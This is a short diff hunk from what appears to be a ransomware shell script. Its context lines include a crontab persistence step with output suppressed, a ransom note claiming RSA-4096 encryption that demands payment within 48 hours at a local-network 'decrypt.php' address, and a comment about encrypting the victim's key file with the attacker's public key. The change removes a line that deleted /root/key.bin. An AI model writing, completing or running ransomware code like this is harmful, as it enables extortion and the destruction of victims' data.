@@ -113,8 +113,6 @@ else
   echo "Could not set crontab" &>/dev/null
 fi
 
-/bin/rm -rf  /root/key.bin &>/dev/null
-
 echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
 
 # Encrypt key.bin with our public key
